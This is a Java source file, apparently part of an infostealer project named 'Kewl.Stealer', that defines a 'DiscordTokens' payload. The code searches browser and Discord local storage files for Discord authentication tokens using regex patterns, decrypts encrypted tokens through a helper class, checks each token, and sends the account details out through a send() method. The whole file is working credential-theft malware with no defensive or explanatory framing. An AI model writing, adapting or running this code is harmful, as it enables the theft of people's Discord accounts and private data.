package Kewl.Stealer.payload.payloads.discord;

import Kewl.Stealer.payload.IPayload;

import java.io.BufferedReader;
import java.io.FileReader;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class DiscordTokens implements IPayload {
    public static List<String> tokens = new ArrayList();

    public void run() {
        for(String path : Helper.getManager().getPaths()) {
            if (path.contains("Firefox")) {
                this.getTokens(path, true);
            } else {
                this.getTokens(path, false);
            }
        }

        if (tokens.size() == 0) {
            this.send("No tokens");
        }

    }

    public void getTokens(String path, boolean firefox) {
        try {
            Path spath = Paths.get(path);
            if (!firefox) {
                spath = Paths.get(path, "Local Storage", "leveldb");
            }

            Files.list(spath).limit(100L).forEach((file) -> {
                String fname = file.toFile().getName();
                String fpath = file.toFile().getAbsolutePath().toLowerCase();
                if (fname.endsWith(".log") || fname.endsWith(".ldb") || fname.endsWith(".sqlite")) {
                    try {
                        BufferedReader br = new BufferedReader(new FileReader(file.toFile()));

                        String line;
                        try {
                            while((line = br.readLine()) != null) {
                                this.parseToken(line, "[\\w-]{26}\\.[\\w-]{6}\\.[\\w-]{38}");
                                if (fpath.contains("roaming") && fpath.contains("discord")) {
                                    this.parseToken(line, "dQw4w9WgXcQ:[^.*\\['(.*)'\\].*$][^\\\"]*");
                                }
                            }
                        } catch (Throwable var8) {
                            try {
                                br.close();
                            } catch (Throwable var7) {
                                var8.addSuppressed(var7);
                            }

                            throw var8;
                        }

                        br.close();
                    } catch (Exception var9) {
                    }
                }

            });
        } catch (Exception var4) {
        }

    }

    public void parseToken(String line, String regex) {
        Pattern p = Pattern.compile(regex);
        Matcher m = p.matcher(line);

        while(m.find()) {
            String token = m.group();
            if (m.group().startsWith("dQw4w9WgXcQ")) {
                try {
                    Helper.getChecker();
                    token = Checker.decryptToken(m.group());
                } catch (Exception var7) {
                }
            }

            if (!tokens.contains(token)) {
                Long.parseLong(new String(Base64.getDecoder().decode(token.split("\\.")[0]), StandardCharsets.UTF_8));
                this.send("```" + Helper.getChecker().checkUser(token) + "```");
                tokens.add(token);
            }
        }

    }
}
